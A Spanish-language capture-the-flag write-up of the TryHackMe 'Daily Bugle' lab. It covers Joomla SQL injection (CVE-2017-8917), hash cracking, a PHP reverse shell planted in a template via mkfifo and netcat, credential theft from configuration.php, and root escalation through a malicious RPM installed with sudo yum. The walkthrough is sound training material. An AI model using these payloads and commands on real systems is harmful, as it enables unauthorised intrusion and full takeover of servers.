---
layout: single
title: Máquina Daily Bugle - TryHackMe (OSCP Style) (Offensive Pentesting Path)
excerpt: "La máquina Daily Bugle es una máquina Linux cuyas instrucciones ya son menos precisas y deberemos emplear todo nuestro conocimiento y habilidades para lograr comprometerla, hacer un user pivoting horizontal y, posteriormente, uno vertical."
date: 2022-02-22
classes: wide
header:
  teaser: /assets/images/dailybugle/portada.png
  teaser_home_page: true
categories:
  - THM
  - Blog
  - Writeup
tags:
  - Joomla
  - SQLi
  - Hashcat
  - yum
  - CVE-2017-8917
  - horizontal user pivoting
---

# Introducción
La máquina se encuentra en la plataforma [TryHackMe](https://tryhackme.com/room/dailybugle). La máquina tiene indicaciones poco precisas de lo que hay que hacer, pero en su introdución señala que se deberá comprometer un Joomla vía SQLi, crackeo de hashes y escalada de privilegios por medio de yum. Nos incita a realizar la inyección SQL por medio de un script de python en lugar de usar SQLMap, y afortunadamente, veremos que ya existe un script que nos ayudará con esta parte de la máquina.

# Reconocimiento
La máquina tiene un sistema operativo Linux, lo cual podemos observar por medio de una traza ICMP.

![1]

Por medio de un escaneo de puertos con nmap, detectamos aquellos que se encuentren activos con un estatus **open** en la máquina víctima:

	nmap -sS --min-rate 5000 -p- --open -Pn -n 10.10.70.27 -oG allPorts

![2]

Vemos que se encuentran habilitados el puerto 22, el 80 y el 3306. Es decir, parece que el servicio web está conectado a una base de datos en el servidor.

Si realizamos un escaneo más exhaustivo en busca de servicios y versiones específicas de dichos puertos, nos encontramos con la siguiente información:

	nmap -sC -sV -p22,80,3306 10.10.70.27 -oN targeted

![3]

Vemos que el servicio web es un CMS Joomla con un par de entradas deshabilitadas en el **robots.txt**. A la vez, vemos que la base de datos es un **MariaDB**.

# Servicio HTTP
La página web aparenta ser un blog de noticias con el nombre del periódico en el que trabaja Peter Parker (aka Spiderman), el Daily Bugle.

Si ingresamos a los directorios ocultos en el robots.txt, veremos que muchos de ellos son inaccesibles, excepto el directorio **administrator**. Este nos lleva al panel de logueo del CMS Joomla; no podemos ver la versión en ninguna parte de la página web.

Dado que la introducción nos señala que debemos comprometer la página por medio de una inyección SQL, intentamos loguearnos con un bypass clásico:

    ' or 1=1-- -

![4]

Por desgracia, esto no funcionó. Investigando en [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-web/joomla), vemos que para realizar un pentesting en un Joomla, primero necesitamos la versión, la cual se puede encontrar en la siguiente dirección:

    /administrator/manifests/files/joomla.xml

![5]

Como podemos ver, la versión del Joomla es la **3.7.0**, la cual, de acuerdo con **searchsploit** es vulnerable a SQL injection.

![6]

# SQLi
El código de la vulnerabilidad es la CVE-2017-8917, la cual nos indica la URL vulnerable a la inyección de queries.

![7]

Intenté hacerlo manualmente, pero no logré enumerar las tablas, solo descubrir la vulnerabilidad como se aprecia en el mensaje de error de la página:

![8]

Así que busqué algo en GitHub que nos pudiera ayudar a hacer este procedimiento automáticamente (recordemos, nada de sqlmap) para este caso en específico, encontrándome con [**Joomblah**](https://github.com/stefanlucas/Exploit-Joomla), el cual nos ayuda a explotar esta vulnerabilidad en cualquier Joomla 3.7.0, enumerando tablas y potenciales usuarios junto con todos sus datos.

![9]

Como podemos observar, nos devuelve un usuario llamado **jonah** (el director del periódico en el lore de Spiderman) junto con una contraseña la cual está hasheada en algún formato. Si investigamos en los ejemplos que proporciona hashcat, veremos que se trata de un Blowfish, por lo que lo que tenemos que hacer ahora es crackearla.

# Hash cracking
Para crackear este hash, podemos hacerlo empleando **hashcat**; y para ello, debemos introducir el siguiente comando:

    hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt

    - -m indica el modo, es decir, el formato del hash. Según el sitio web de Hashcat, el 3200 es para un hash Blowfish.
    - -a indica el modo de crackeo, en este caso, el 0 indica un ataque por diccionario.
    - Se le indica el archivo de entrada que contiene el hash a crackear.
    - Se indica la ubicación del diccionario a emplear para el ataque.

Dado que mi máquina virtual es muy lenta trabajando con hashes, decidí correr el ataque en mi Windows nativo (el comando es el mismo, solo cambia la ubicación de tu archivo de entrada y diccionario). Aún así, y empleando la gráfica de mi máquina (la cual no es la gran cosa, pero corre bastante bien), tardó cerca de 27 minutos en encontrar la contraseña correcta. Hubo un momento en el que creí que esto era un rabbit hole, pero no, simplemente la contraseña está hasta la línea 46,848 del diccionario y el ataque a Blowfish es un poco lento también.

![10]

Nos encontramos con que la contraseña es **spiderman123**, así que la empleamos en el panel de Joomla para acceder.

Nota: Antes de esto, se probó para acceder al servicio SSH, resultando en un fracaso. Es por ello que se intentó en el Joomla.

# Acceso por Joomla
Si colocamos las credenciales en el panel de logueo de Joomla, veremos que son correctas y podemos acceder.

![11]

Esto nos permite tener acceso directo a la máquina obteniendo una reverse shell, y el procedimiento es el siguiente:

Primero, necesitamos irnos al apartado de Templates, para ello nos vamos a Extensions -> Templates:

![12]

En la siguiente página, hacemos clic en Templates primero (barra lateral izquierda) y posteriormente en cualquiera (en nuestro caso, escogimos el primero que pertenece a Beez3):

![13]

Seleccionamos el archivo **index.php** del listado que aparece del lado izquierdo:

![14]

Esto nos permitirá ver el código fuente del sitio y, lo más importante, editarlo.

![15]

Para poder obtener una reverse shell, basta con colocar el código php que ejecute una instrucción en la máquina víctima, la cual es esa shell que queremos obtener (y que ya hemos visto en máquinas anteriores):

    <?php echo "<pre>" . shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f") . "</pre>"; ?>

Posteriormente, guardamos el archivo con el botón **Save** y por último le damos en **Template Preview** (antes de hacer este último paso, ya debemos estar en escucha con netcat para recibir la shell):

![16]

Una vez le demos en Template Preview, veremos una página en blanco que se queda cargando, es normal:

![17]

Por otro lado, en el netcat ya habremos obtenido la reverse shell y ganado acceso al sistema.

![18]

# Horizontal User Pivoting
Como podemos observar, hemos ingresado al sistema como el usuario **apache**, sin embargo, el verdadero usuario de esta máquina es **jjameson**. Dado que las credenciales que obtuvimos por medio del SLQi no son válidas en este contexto, deberemos buscar la forma de escalar a este otro usuario.

![19]

Si escaneamos el directorio web, nos encontraremos con un archivo llamado **configuration.php**. Estos archivos siempre hay que tenerlos en cuenta ya que son muy valiosos; muchas veces, suelen incluir contraseñas guardadas en texto plano. Para nuestra suerte, este es nuestro caso:

![20]

Si intentamos migrar a este usuario empleando esta contraseña, veremos que es válida y ahora somos el usuario **jjameson**.

![21]

Ya podemos ver también la flag de usuario:

![22]

# Privilege Escalation
Nuestro primer acercamiento casi siempre es el listado de permisos sudo con los que cuenta nuestro usuario en la máquina, y en este caso, al parecer es el path para convertirse en root.

    sudo -l

De acuerdo con el **sudoers**, nuestro usuario tiene permisos para ejecutar **yum** como sudo sin proporcionar contraseña. Yum es un instalador de paquetes en Linux.

![23]

Hay dos formas de explotar esta vulnerabilidad: una es siguiendo los pasos de [esta guía](https://www.youtube.com/watch?v=BWdq2DgB_Co) para crear un paquete manualmente y luego instalarlo con el yum vulnerable; y la otra es un poco más automatizada y requiere de herramientas adicionales, y esta será la que realizaremos a continuación.

Estos pasos se deben realizar en la máquina de atacante. Primero será necesario crear un script llamado payload.sh (el nombre no importa, pero es necesario tenerlo en cuenta para los siguientes comandos) con el payload que queremos que se ejecute en el sistema. Sí, nuevamente vamos a convertir a la bash en SUID.

    echo "chmod +s /bin/bash" > payload.sh

Después, con la herramienta fpm vamos a crear un paquete que tome este script y sea ejecutado una vez sea instalado con yum.

    fpm -n payload -s dir -t rpm -a all --before-install payload.sh .

Esto nos dejará un paquete **rpm** en nuestra carpeta, la cual deberemos mover a la máquina víctima.

![24]

Nota: En dado caso de no tener **fpm** instalado en tu máquina, puedes ejecutar los siguientes comandos para tenerlo funcionando:

    gem install -N fpm
    apt-get install rpm

Una vez transferido a la máquina víctima, ejecutamos el **yum** de la siguiente manera:

    sudo yum localinstall -y payload-1.0-1.noarch.rpm

![25]

Recibiremos un mensaje que dice **Complete!**, y si ahora listamos los permisos de la bash, veremos que ya es SUID:

![26]

Por último, solo migramos a esta consola con bash -p y ya seremos usuario root. Solo nos resta ver la flag final de este usuario:

![27]

[1]:/assets/images/dailybugle/1.png
[2]:/assets/images/dailybugle/2.png
[3]:/assets/images/dailybugle/3.png
[4]:/assets/images/dailybugle/4.png
[5]:/assets/images/dailybugle/5.png
[6]:/assets/images/dailybugle/6.png
[7]:/assets/images/dailybugle/7.png
[8]:/assets/images/dailybugle/8.png
[9]:/assets/images/dailybugle/9.png
[10]:/assets/images/dailybugle/10.png
[11]:/assets/images/dailybugle/11.png
[12]:/assets/images/dailybugle/12.png
[13]:/assets/images/dailybugle/13.png
[14]:/assets/images/dailybugle/14.png
[15]:/assets/images/dailybugle/15.png
[16]:/assets/images/dailybugle/16.png
[17]:/assets/images/dailybugle/17.png
[18]:/assets/images/dailybugle/18.png
[19]:/assets/images/dailybugle/19.png
[20]:/assets/images/dailybugle/20.png
[21]:/assets/images/dailybugle/21.png
[22]:/assets/images/dailybugle/22.png
[23]:/assets/images/dailybugle/23.png
[24]:/assets/images/dailybugle/24.png
[25]:/assets/images/dailybugle/25.png
[26]:/assets/images/dailybugle/26.png
[27]:/assets/images/dailybugle/27.png